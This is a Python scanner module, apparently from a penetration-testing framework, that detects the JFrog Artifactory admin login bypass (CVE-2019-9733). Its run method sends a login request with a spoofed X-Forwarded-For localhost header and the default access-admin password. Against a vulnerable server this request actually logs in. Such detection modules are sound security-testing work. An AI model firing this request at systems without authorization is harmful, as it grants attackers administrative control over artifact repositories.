#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JFrog Artifactory 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'JFrog Artifactory 6.7.3 - Admin Login Bypass Detection',
        'description': "JFrog Artifactory 6.7.3 is vulnerable to an admin login bypass issue because by default the access-admin account is used to reset the password of the admin account. While this is only allowable from a connection directly from localhost, providing an X-Forwarded-For HTTP header to the request allows an unauthenticated user to login with the default credentials of the access-admin account while bypassing the whitelist of allowed IP addresses. The access-admin account can use Artifactory's API to request authentication tokens for all users including the admin account and, in turn, assume full control of all artifacts and repositories managed by Artifactory.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'artifactory', 'login', 'jfrog', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/152172/JFrog-Artifactory-Administrator-Authentication-Bypass.html',
            'https://www.ciphertechs.com/jfrog-artifactory-advisory/',
            'https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-9733',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-9733',
    }

    def run(self):
        path = '/artifactory/ui/auth/login?_spring_security_remember_me=false'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'application/json, text/plain, */*', 'X-Requested-With': 'artUI', 'X-Forwarded-For': '127.0.0.1', 'Request-Agent': 'artifactoryUI', 'Content-Type': 'application/json', 'Origin': '{{BaseURL}}', 'Referer': '{{BaseURL}}/artifactory/webapp/'}, data='{"user":"access-admin","password":"password","type":"login"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"username": "access-admin"',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='JFrog Artifactory 6.7.3 - Admin Login Bypass detected', path=path)
            return True
        return False

